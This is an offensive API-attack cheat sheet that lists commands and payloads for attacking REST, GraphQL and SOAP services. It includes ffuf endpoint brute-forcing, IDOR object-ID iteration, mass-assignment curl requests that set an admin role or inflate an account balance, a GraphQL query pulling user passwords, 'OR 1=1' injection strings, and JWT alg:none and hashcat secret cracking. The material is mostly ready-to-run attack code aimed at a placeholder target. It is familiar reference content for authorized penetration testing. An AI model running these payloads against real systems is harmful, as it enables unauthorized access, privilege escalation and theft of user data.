# Web Service & API Attacks

Attacking REST APIs, SOAP services, and GraphQL endpoints — including mass assignment, BOLA, injection, and authentication flaws.

## REST API Recon

```bash
# Common API paths
/api/v1/
/api/v2/
/swagger.json
/swagger-ui.html
/openapi.json
/api-docs
/.well-known/

# Brute force API endpoints
ffuf -u http://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Enumerate API methods
curl -X OPTIONS http://target.com/api/users
```

## BOLA / IDOR in APIs

```bash
# Broken Object Level Authorization
GET /api/users/1/orders      → change 1 to 2,3,...
GET /api/orders/ORDER-001    → iterate order IDs

# Check if authorization is enforced
curl -H "Authorization: Bearer victim_token" http://target.com/api/users/2/data
```

## Mass Assignment

```bash
# Registration endpoint — add admin field
curl -X POST http://target.com/api/users/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"pass","role":"admin","isVerified":true}'

# Update endpoint
curl -X PUT http://target.com/api/users/1 \
  -H "Authorization: Bearer token" \
  -d '{"name":"test","balance":9999999}'
```

## GraphQL

```bash
# Introspection query — discover schema
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# Query all users
curl -X POST http://target.com/graphql \
  -d '{"query":"{users{id username password email}}"}'

# GraphQL injection
{"query":"{user(id:\"1 OR 1=1\"){username}}"}
```

## SOAP (WSDL)

```bash
# Fetch WSDL
curl "http://target.com/service?wsdl"

# Basic SOAP request
curl -X POST http://target.com/service \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <GetUser><id>1</id></GetUser>
  </soapenv:Body>
</soapenv:Envelope>'

# SOAP injection
<id>1 OR 1=1</id>
```

## JWT Testing

```bash
# Decode JWT (3 base64 parts separated by .)
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d

# Test none algorithm
# Craft token with alg:none and no signature

# Brute force secret
hashcat -a 0 -m 16500 token.txt rockyou.txt
```
